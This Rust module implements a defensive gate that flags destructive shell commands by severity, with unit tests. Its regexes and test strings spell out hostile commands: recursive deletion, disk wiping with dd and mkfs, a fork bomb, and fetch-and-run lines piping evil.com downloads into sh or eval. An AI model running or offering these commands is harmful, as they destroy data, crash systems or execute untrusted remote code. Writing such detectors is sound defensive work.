//! Destructive-command taxonomy: per-rule severity drives the verdict tier.
//!
//! Each [`DestructiveRule`] carries a stable `id`, a `severity` (mapped to a
//! tier by [`crate::verdict::severity_to_tier`]), a `category`, and a `matcher`
//! over a single (already resolved/decoded) leg. Severities follow the spine
//! defaults: clearly destructive => `>= 8` (Block), ambiguous => `5..=7` (Warn).
//!
//! Two match surfaces exist on purpose:
//! - Per-leg rules in [`rules`] run against each compound leg AFTER split, var
//!   resolution, and base64 decode.
//! - [`fetch_pipe_to_shell`] runs against the ORIGINAL (pre-split) command,
//!   because `curl … | sh` is a pipe relationship that disappears once the
//!   command is split into legs — the legacy gate's dead `|sh` substring check.

use std::sync::OnceLock;

use regex::Regex;

/// A single destructive-pattern rule.
pub struct DestructiveRule {
    /// Stable identifier for reporting.
    pub id: &'static str,
    /// Severity that drives the tier (see [`crate::verdict::Thresholds`]).
    pub severity: u8,
    /// Category label for reporting.
    pub category: &'static str,
    /// Predicate over a single resolved/decoded leg.
    pub matcher: fn(&str) -> bool,
}

impl DestructiveRule {
    /// True iff this rule matches `leg`.
    pub fn matches(&self, leg: &str) -> bool {
        (self.matcher)(leg)
    }
}

macro_rules! re {
    ($name:ident, $pat:expr) => {{
        static CELL: OnceLock<Regex> = OnceLock::new();
        CELL.get_or_init(|| Regex::new($pat).expect(concat!("valid regex: ", $pat)))
            .is_match($name)
    }};
}

fn m_rm_rf(s: &str) -> bool {
    // rm with a recursive+force combination, in either order, including
    // bundled short flags (-rf / -fr / -Rf / combined like -rfv).
    re!(
        s,
        r"(?i)\brm\b[^|;&\n]*\s-[a-z]*r[a-z]*f|(?i)\brm\b[^|;&\n]*\s-[a-z]*f[a-z]*r"
    )
}

fn m_find_delete(s: &str) -> bool {
    re!(s, r"(?i)\bfind\b.*-delete\b")
}

fn m_find_exec_rm(s: &str) -> bool {
    re!(s, r"(?i)\bfind\b.*-exec\s+rm\b")
}

fn m_dd(s: &str) -> bool {
    re!(s, r"(?i)\bdd\b[^|;&\n]*\sif=")
}

fn m_mkfs(s: &str) -> bool {
    re!(s, r"(?i)\bmkfs(\.\w+)?\b")
}

fn m_chmod_777(s: &str) -> bool {
    re!(s, r"(?i)\bchmod\b[^|;&\n]*\s0?777\b")
}

fn m_chmod_recursive(s: &str) -> bool {
    re!(s, r"(?i)\bchmod\b[^|;&\n]*\s-[a-z]*R")
}

fn m_chown_recursive_root(s: &str) -> bool {
    // chown -R … targeting / (root) is far more dangerous than a local dir.
    re!(s, r"(?i)\bchown\b[^|;&\n]*\s-[a-z]*R[^|;&\n]*\s/(\s|$)")
}

fn m_fork_bomb(s: &str) -> bool {
    // Classic `:(){ :|:& };:` — tolerate whitespace variations.
    let compact: String = s.chars().filter(|c| !c.is_whitespace()).collect();
    compact.contains(":(){:|:&};:")
}

fn m_chmod_recursive_777_root(s: &str) -> bool {
    // Recursive chmod 777 targeting `/` is catastrophic (unlike a local file).
    // Requires the recursive flag, the 777 mode, AND a `/` (root) target in any
    // order, so both `chmod 777 -R /` and `chmod -R 777 /` are caught.
    re!(
        s,
        r"(?i)\bchmod\b[^|;&\n]*\s-[a-z]*R[a-z]*\b[^|;&\n]*\s0?777\b[^|;&\n]*\s/(\s|$)"
    ) || re!(
        s,
        r"(?i)\bchmod\b[^|;&\n]*\s0?777\b[^|;&\n]*\s-[a-z]*R[a-z]*\b[^|;&\n]*\s/(\s|$)"
    )
}

fn m_write_block_device(s: &str) -> bool {
    // Redirect or dd-output to a raw disk device.
    re!(
        s,
        r"(?i)(>|of=)\s*/dev/(sd[a-z]|nvme\d+n\d+|vd[a-z]|hd[a-z]|mmcblk\d+)"
    )
}

fn m_mv_to_devnull(s: &str) -> bool {
    re!(s, r"(?i)\bmv\b[^|;&\n]*\s/dev/null\b")
}

fn m_fetch_run_inline(s: &str) -> bool {
    // A curl/wget download whose output is consumed by an inline interpreter on
    // the SAME leg via substitution, e.g. `bash -c "$(curl …)"` or
    // `eval "$(wget …)"`. (The classic `curl | sh` PIPE form is caught
    // pre-split by `fetch_pipe_to_shell`, since the pipe is gone after split.)
    re!(
        s,
        r"(?i)\b(bash|sh|zsh|eval|python\d?|perl|ruby)\b.*\$\(\s*(curl|wget)\b"
    )
}

/// All per-leg destructive rules.
pub fn rules() -> &'static [DestructiveRule] {
    &[
        DestructiveRule {
            id: "rm-rf",
            severity: 9,
            category: "destructive",
            matcher: m_rm_rf,
        },
        DestructiveRule {
            id: "find-delete",
            severity: 8,
            category: "destructive",
            matcher: m_find_delete,
        },
        DestructiveRule {
            id: "find-exec-rm",
            severity: 8,
            category: "destructive",
            matcher: m_find_exec_rm,
        },
        DestructiveRule {
            id: "dd-overwrite",
            severity: 8,
            category: "destructive",
            matcher: m_dd,
        },
        DestructiveRule {
            id: "mkfs",
            severity: 9,
            category: "destructive",
            matcher: m_mkfs,
        },
        DestructiveRule {
            id: "chmod-777",
            severity: 6,
            category: "permissions",
            matcher: m_chmod_777,
        },
        DestructiveRule {
            id: "chmod-recursive",
            severity: 6,
            category: "permissions",
            matcher: m_chmod_recursive,
        },
        DestructiveRule {
            // Recursive 777 of root is catastrophic — Block, unlike a local 777.
            id: "chmod-recursive-777-root",
            severity: 9,
            category: "permissions",
            matcher: m_chmod_recursive_777_root,
        },
        DestructiveRule {
            id: "chown-recursive-root",
            severity: 9,
            category: "permissions",
            matcher: m_chown_recursive_root,
        },
        DestructiveRule {
            id: "fork-bomb",
            severity: 9,
            category: "dos",
            matcher: m_fork_bomb,
        },
        DestructiveRule {
            id: "write-block-device",
            severity: 9,
            category: "destructive",
            matcher: m_write_block_device,
        },
        DestructiveRule {
            id: "mv-to-devnull",
            severity: 7,
            category: "destructive",
            matcher: m_mv_to_devnull,
        },
        DestructiveRule {
            id: "fetch-run-inline",
            severity: 8,
            category: "remote-exec",
            matcher: m_fetch_run_inline,
        },
    ]
}

/// The text a leg's destructive matchers should run against, after accounting
/// for verb-awareness.
///
/// PLAIN text inside a QUOTED ARGUMENT to a NON-EXECUTING verb
/// (`git commit -m/-F`, `git tag -m`, `git notes add -m`, `echo`, `printf`, a
/// leading `#` comment) is DATA, not a command — so this strips those quoted
/// spans, suppressing the match (the commit-message false-positive fix). For an
/// EXECUTING verb (`sh -c`, `bash -c`, `zsh -c`, `dash -c`, `eval`,
/// `xargs … rm/sh/bash`, `env … sh`, `find … -exec`) the quoted content IS run,
/// so the leg is returned unchanged and still matches. Anything not clearly
/// non-executing is treated as executing (fail toward Block — FN preserved).
///
/// IMPORTANT: stripping a quoted span here only removes the INERT plain text.
/// A `$(...)`/backtick substitution inside a DOUBLE-quoted span is LIVE bash
/// code that bash runs regardless of the outer verb; those bodies are surfaced
/// separately by [`live_substitution_bodies`] and scanned as commands, so this
/// stripping cannot hide them. (Inside SINGLE quotes a substitution is literal,
/// so it is correctly suppressed by the strip.)
pub fn effective_match_text(leg: &str) -> String {
    // A comment line is entirely inert text.
    if leg.trim_start().starts_with('#') {
        return String::new();
    }
    if is_non_executing_verb(leg) {
        strip_quoted_spans(leg)
    } else {
        leg.to_string()
    }
}

/// The bodies of LIVE command substitutions (`$(...)`, `` `...` ``) that a
/// non-executing verb's quoted argument would still cause bash to execute.
///
/// A `$()`/backtick inside a DOUBLE-quoted span is live code: bash runs its body
/// and interpolates the result, so `echo "$(rm -rf ~)"` deletes the home dir
/// even though `echo` itself is non-executing. [`effective_match_text`] strips
/// the inert plain text of such an argument (preserving the commit-message FP
/// fix), which would also delete these substitutions before matching — so this
/// returns each live body for the caller to re-scan AS A COMMAND through the
/// normal pipeline. The substitution body is always evaluated as a command,
/// independent of the outer verb, which is exactly bash's behavior.
///
/// Returns empty for EXECUTING verbs (their whole content is already kept and
/// matched by [`effective_match_text`]) and for comments (inert). Single-quoted
/// substitutions are literal and are NOT returned.
pub fn live_substitution_bodies(leg: &str) -> Vec<String> {
    if leg.trim_start().starts_with('#') {
        return Vec::new();
    }
    if !is_non_executing_verb(leg) {
        return Vec::new();
    }
    crate::gate::compound::extract_double_quoted_substitutions(leg)
}

/// True iff the leg's HEAD verb is one whose quoted arguments are DATA, not a
/// command to execute.
pub fn is_non_executing_verb(leg: &str) -> bool {
    let trimmed = leg.trim_start();
    let mut tokens = trimmed.split_whitespace();
    let verb = match tokens.next() {
        Some(v) => v,
        None => return false,
    };
    match verb {
        "echo" | "printf" => true,
        "git" => {
            // git commit -m/-F, git tag -m, etc. carry a message as DATA.
            matches!(tokens.next(), Some("commit") | Some("tag") | Some("notes"))
        }
        _ => false,
    }
}

/// Remove the contents of single- and double-quoted spans (keeping the quote
/// delimiters so token boundaries survive), so a destructive substring that
/// lives ONLY inside a quoted argument no longer matches.
fn strip_quoted_spans(leg: &str) -> String {
    let bytes = leg.as_bytes();
    let mut out = String::with_capacity(leg.len());
    let mut i = 0usize;
    while i < bytes.len() {
        let c = bytes[i];
        if c == b'"' || c == b'\'' {
            // Emit the opening quote, skip the body, emit the closing quote.
            out.push(c as char);
            i += 1;
            while i < bytes.len() && bytes[i] != c {
                i += 1;
            }
            if i < bytes.len() {
                out.push(c as char); // closing quote
                i += 1;
            }
            continue;
        }
        out.push(c as char);
        i += 1;
    }
    out
}

/// Detect the `curl … | sh` / `wget … | sh` fetch-piped-to-shell pattern by
/// analysing the ORIGINAL command's pipe structure (NOT a post-split substring).
///
/// Returns the matching `DestructiveRule`-equivalent (id, severity, category) if
/// a download stage pipes directly into a shell interpreter stage.
pub fn fetch_pipe_to_shell(command: &str) -> Option<(&'static str, u8, &'static str)> {
    let stages: Vec<&str> = command.split('|').map(str::trim).collect();
    if stages.len() < 2 {
        return None;
    }

    let mut saw_fetch = false;
    for stage in &stages {
        let head = stage.split_whitespace().next().unwrap_or("");
        if head == "curl" || head == "wget" {
            saw_fetch = true;
            continue;
        }
        if saw_fetch && is_shell_interpreter(head) {
            return Some(("curl-wget-pipe-shell", 9, "remote-exec"));
        }
    }
    None
}

/// Detect a fork bomb (`:(){ :|:& };:`) on the ORIGINAL (pre-split) command.
///
/// The classic form contains `;`, `|`, and `&`, so `split_compound` shreds the
/// signature across legs before any per-leg matcher can see it (the same reason
/// `fetch_pipe_to_shell` is checked pre-split). Returns the rule triple if the
/// whitespace-insensitive signature is present.
pub fn fork_bomb_presplit(command: &str) -> Option<(&'static str, u8, &'static str)> {
    if m_fork_bomb(command) {
        Some(("fork-bomb", 9, "dos"))
    } else {
        None
    }
}

fn is_shell_interpreter(head: &str) -> bool {
    matches!(
        head,
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "eval"
    ) || head.starts_with("python")
        || head == "perl"
        || head == "ruby"
        || head == "node"
}

#[cfg(test)]
mod tests {
    use super::*;

    fn matches_any(leg: &str) -> Option<&'static str> {
        rules().iter().find(|r| r.matches(leg)).map(|r| r.id)
    }

    fn max_sev(leg: &str) -> u8 {
        rules()
            .iter()
            .filter(|r| r.matches(leg))
            .map(|r| r.severity)
            .max()
            .unwrap_or(0)
    }

    #[test]
    fn rm_rf_variants() {
        assert!(m_rm_rf("rm -rf ~"));
        assert!(m_rm_rf("rm -fr /tmp/x"));
        assert!(m_rm_rf("rm -Rf /"));
        assert!(m_rm_rf("rm -rfv /data"));
        assert!(!m_rm_rf("rm file.txt"));
        assert!(!m_rm_rf("rm -f single.txt")); // force without recursive
    }

    #[test]
    fn find_delete_and_exec() {
        assert_eq!(matches_any("find . -delete"), Some("find-delete"));
        assert_eq!(
            matches_any("find / -name '*.log' -exec rm {} ;"),
            Some("find-exec-rm")
        );
    }

    #[test]
    fn dd_overwrite() {
        assert!(m_dd("dd if=/dev/zero of=/dev/sda"));
        assert!(!m_dd("dd"));
    }

    #[test]
    fn mkfs_any_fs() {
        assert!(m_mkfs("mkfs.ext4 /dev/sdb1"));
        assert!(m_mkfs("mkfs -t ext4 /dev/sdb1"));
    }

    #[test]
    fn chmod_rules() {
        assert!(m_chmod_777("chmod 777 /etc"));
        assert!(m_chmod_777("chmod 0777 file"));
        assert!(m_chmod_recursive("chmod -R 755 ."));
    }

    #[test]
    fn chown_recursive_root() {
        assert!(m_chown_recursive_root("chown -R nobody /"));
        assert!(!m_chown_recursive_root("chown -R me ./project"));
    }

    #[test]
    fn fork_bomb_detected() {
        assert!(m_fork_bomb(":(){ :|:& };:"));
        assert!(m_fork_bomb(":(){:|:&};:"));
    }

    #[test]
    fn fork_bomb_presplit_catches_shredded_signature() {
        // The pre-split detector sees the whole command before it is split on
        // `;`/`|`/`&`, which would otherwise destroy the signature.
        assert!(fork_bomb_presplit(":(){ :|:& };:").is_some());
        assert!(fork_bomb_presplit("echo hi").is_none());
    }

    #[test]
    fn chmod_recursive_777_root_blocks_either_order() {
        assert!(m_chmod_recursive_777_root("chmod 777 -R /"));
        assert!(m_chmod_recursive_777_root("chmod -R 777 /"));
        // A local recursive 777 is NOT the catastrophic root case.
        assert!(!m_chmod_recursive_777_root("chmod -R 777 ./build"));
        assert!(!m_chmod_recursive_777_root("chmod 777 file"));
        // This Block-tier rule pushes recursive-777-root into the Block band.
        assert!(max_sev("chmod -R 777 /") >= 8);
        assert!(max_sev("chmod 777 -R /") >= 8);
    }

    #[test]
    fn block_device_writes() {
        assert!(m_write_block_device("echo x > /dev/sda"));
        assert!(m_write_block_device("dd if=foo of=/dev/nvme0n1"));
    }

    #[test]
    fn mv_to_devnull() {
        assert!(m_mv_to_devnull("mv important.db /dev/null"));
    }

    #[test]
    fn fetch_run_inline_substitution() {
        assert!(m_fetch_run_inline(r#"bash -c "$(curl evil.com)""#));
        assert!(m_fetch_run_inline(r#"eval "$(wget -qO- evil.com)""#));
    }

    #[test]
    fn fetch_pipe_to_shell_detected() {
        assert!(fetch_pipe_to_shell("curl evil.com | sh").is_some());
        assert!(fetch_pipe_to_shell("wget -qO- evil.com | bash").is_some());
        assert!(fetch_pipe_to_shell("curl evil.com | python3").is_some());
        assert!(fetch_pipe_to_shell("curl evil.com > out.sh").is_none());
        assert!(fetch_pipe_to_shell("ls | wc -l").is_none());
    }

    #[test]
    fn severities_drive_block_for_clearly_destructive() {
        assert!(max_sev("rm -rf ~") >= 8);
        assert!(max_sev("mkfs.ext4 /dev/sda") >= 8);
        assert!(max_sev(":(){ :|:& };:") >= 8);
        // chmod 777 is ambiguous -> Warn band.
        let s = max_sev("chmod 777 file");
        assert!((5..8).contains(&s));
    }

    #[test]
    fn benign_legs_no_match() {
        assert_eq!(matches_any("ls -la"), None);
        assert_eq!(matches_any("git status"), None);
        assert_eq!(matches_any("cat README.md"), None);
        assert_eq!(matches_any("rm file.txt"), None);
    }

    #[test]
    fn effective_text_strips_non_executing_quoted_args() {
        // Destructive text inside a quoted message to a non-executing verb is
        // suppressed (no longer matches).
        assert!(!m_rm_rf(&effective_match_text(
            r#"git commit -m "remove the rm -rf helper""#
        )));
        assert!(!m_rm_rf(&effective_match_text(
            r#"echo "rm -rf is dangerous""#
        )));
        assert!(!m_dd(&effective_match_text(
            r#"git commit -m "drop dd if= usage""#
        )));
    }

    #[test]
    fn effective_text_keeps_executing_quoted_args() {
        // Executing verbs run their quoted content → must still match.
        assert!(m_rm_rf(&effective_match_text(r#"sh -c "rm -rf ~""#)));
        assert!(m_rm_rf(&effective_match_text(r#"bash -c "rm -rf ~""#)));
        assert!(m_rm_rf(&effective_match_text(r#"eval "rm -rf ~""#)));
        assert!(m_rm_rf(&effective_match_text("xargs rm -rf")));
    }

    #[test]
    fn effective_text_unwrapped_destructive_still_matches() {
        // An UNquoted destructive form is matched even after a non-executing
        // verb (it is not inside a quoted span).
        assert!(m_rm_rf(&effective_match_text("echo foo; rm -rf ~")));
    }

    #[test]
    fn comment_line_is_inert() {
        assert!(!m_rm_rf(&effective_match_text("# rm -rf ~ would be bad")));
    }

    #[test]
    fn live_substitution_bodies_extracts_double_quoted_subst() {
        // A `$()`/backtick inside a DOUBLE-quoted arg to a non-executing verb is
        // LIVE code — its body must be surfaced for command scanning.
        assert_eq!(
            live_substitution_bodies(r#"echo "$(rm -rf ~)""#),
            vec!["rm -rf ~".to_string()]
        );
        assert_eq!(
            live_substitution_bodies(r#"git commit -m "$(rm -rf ~)""#),
            vec!["rm -rf ~".to_string()]
        );
        assert_eq!(
            live_substitution_bodies(r#"git commit -m "`rm -rf ~`""#),
            vec!["rm -rf ~".to_string()]
        );
    }

    #[test]
    fn live_substitution_bodies_ignores_single_quoted_subst() {
        // Inside SINGLE quotes a `$()` is literal — bash does not expand it.
        assert!(live_substitution_bodies(r#"git commit -m 'literal $(rm -rf ~)'"#).is_empty());
        assert!(live_substitution_bodies(r#"echo 'no $(rm -rf ~) here'"#).is_empty());
    }

    #[test]
    fn live_substitution_bodies_empty_for_executing_verbs_and_plain_text() {
        // Executing verbs already keep their whole content (handled elsewhere).
        assert!(live_substitution_bodies(r#"sh -c "$(rm -rf ~)""#).is_empty());
        // Plain (substitution-free) quoted text yields nothing to scan.
        assert!(live_substitution_bodies(r#"git commit -m "remove the rm -rf helper""#).is_empty());
        // A comment is inert.
        assert!(live_substitution_bodies(r#"# echo "$(rm -rf ~)""#).is_empty());
    }

    #[test]
    fn live_substitution_bodies_surfaces_multiple() {
        assert_eq!(
            live_substitution_bodies(r#"echo "$(rm -rf ~)" "$(find . -delete)""#),
            vec!["rm -rf ~".to_string(), "find . -delete".to_string()]
        );
    }
}
